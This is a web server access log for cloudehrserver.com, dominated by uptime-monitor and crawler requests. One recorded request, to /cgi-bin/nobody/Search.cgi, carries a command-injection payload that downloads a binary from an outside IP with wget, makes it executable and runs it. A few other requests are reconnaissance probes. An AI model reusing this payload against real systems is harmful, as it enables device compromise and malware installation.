63.143.42.249 - - [18/Oct/2018:04:00:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:01:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:02:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:03:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:04:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:05:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:06:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:07:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:08:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:09:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:10:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:11:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:12:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:13:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:14:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:15:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:16:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:17:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:18:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:19:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:20:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
46.229.168.140 - - [18/Oct/2018:04:21:25 +0000] "GET /robots.txt HTTP/1.1" 500 813 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
46.229.168.132 - - [18/Oct/2018:04:21:30 +0000] "GET /contact?lang=en HTTP/1.1" 500 813 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
63.143.42.249 - - [18/Oct/2018:04:21:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:22:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:23:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:24:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
46.229.168.130 - - [18/Oct/2018:04:25:03 +0000] "GET /aprende/ehrserver_web_console HTTP/1.1" 500 813 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
63.143.42.249 - - [18/Oct/2018:04:25:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:26:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:27:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:28:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:29:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:30:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:31:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:32:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:33:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:34:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:35:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:36:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
92.1.180.250 - - [18/Oct/2018:04:36:53 +0000] "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.40.213/avtech%20-O%20niXd;%20chmod%20777%20niXd;%20sh%20niXd)&password=admin HTTP/1.1" 400 0 "-" "Sefa"
63.143.42.249 - - [18/Oct/2018:04:37:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:38:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
173.211.119.116 - - [18/Oct/2018:04:38:34 +0000] "GET / HTTP/1.1" 500 813 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
63.143.42.249 - - [18/Oct/2018:04:39:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:40:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:41:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:42:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:43:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:44:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:45:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:46:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:47:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:48:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:49:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
51.38.12.13 - - [18/Oct/2018:04:50:26 +0000] "GET / HTTP/1.1" 500 4776 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
63.143.42.249 - - [18/Oct/2018:04:50:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
212.8.253.137 - - [18/Oct/2018:04:50:55 +0000] "GET /.DS_Store HTTP/1.1" 500 810 "-" "fasthttp"
118.24.111.232 - - [18/Oct/2018:04:51:23 +0000] "GET /console/css/dashboard-min.css HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.24.111.232 - - [18/Oct/2018:04:51:24 +0000] "GET /status HTTP/1.1" 500 813 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
63.143.42.249 - - [18/Oct/2018:04:51:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:52:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:53:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:54:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:55:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:56:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:57:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.22 - - [18/Oct/2018:04:57:41 +0000] "GET /robots.txt HTTP/1.1" 500 4275 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
63.143.42.249 - - [18/Oct/2018:04:58:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:04:59:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:00:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
46.37.21.50 - - [18/Oct/2018:05:01:22 +0000] "GET /manager/html HTTP/1.1" 500 808 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
63.143.42.249 - - [18/Oct/2018:05:01:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:02:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:03:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:04:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:05:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:06:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:07:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:08:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:09:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:10:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.22 - - [18/Oct/2018:05:11:15 +0000] "GET /robots.txt HTTP/1.1" 500 4275 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
63.143.42.249 - - [18/Oct/2018:05:11:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:12:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:13:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:14:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:15:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:16:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:17:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:18:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:19:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:20:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:21:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:22:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:23:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:24:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:25:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:26:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:27:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:28:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:29:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:30:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:31:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:32:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:33:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:34:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:35:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:36:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:37:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:38:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:39:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:40:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
167.61.12.112 - - [18/Oct/2018:05:41:28 +0000] "GET /index HTTP/1.1" 500 813 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
63.143.42.249 - - [18/Oct/2018:05:41:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:42:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:43:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:44:34 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
63.143.42.249 - - [18/Oct/2018:05:45:33 +0000] "GET / HTTP/1.1" 500 4304 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
167.61.12.112 - - [18/Oct/2018:05:46:20 +0000] "GET /css/bootstrap.min.css HTTP/1.1" 200 20047 "http://cloudehrserver.com/index" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
167.61.12.112 - - [18/Oct/2018:05:46:20 +0000] "GET /index HTTP/1.1" 404 3948 "http://cloudehrserver.com/index" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
63.143.42.249 - - [18/Oct/2018:05:46:33 +0000] "GET / HTTP/1.1" 200 9195 "https://cloudehrserver.com" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
167.61.12.112 - - [18/Oct/2018:05:47:28 +0000] "GET /index HTTP/1.1" 200 5835 "http://cloudehrserver.com/index" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
167.61.12.112 - - [18/Oct/2018:05:48:21 +0000] "GET /index HTTP/1.1" 200 5795 "http://cloudehrserver.com/index" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
167.61.12.112 - - [18/Oct/2018:05:48:44 +0000] "POST /code/MailController.php HTTP/1.1" 200 536 "https://cloudehrserver.com/contact" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
